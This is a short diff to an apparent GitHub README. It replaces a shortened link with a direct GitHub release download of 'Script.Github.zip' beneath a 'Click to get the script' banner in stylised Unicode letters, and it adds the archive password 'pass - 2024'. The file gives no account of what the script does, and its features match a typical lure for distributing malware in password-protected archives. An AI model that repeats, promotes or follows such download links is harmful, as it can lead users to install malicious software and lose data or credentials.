@@ -1,5 +1,5 @@
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://bit.ly/3CL2VbS)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/blackpearljays4001/huij/releases/download/Install/Script.Github.zip)***
 # pass - 2024
 
 ![hq720](https://github.com/user-attachments/assets/a91af273-5218-4586-862c-25545a6d1389)
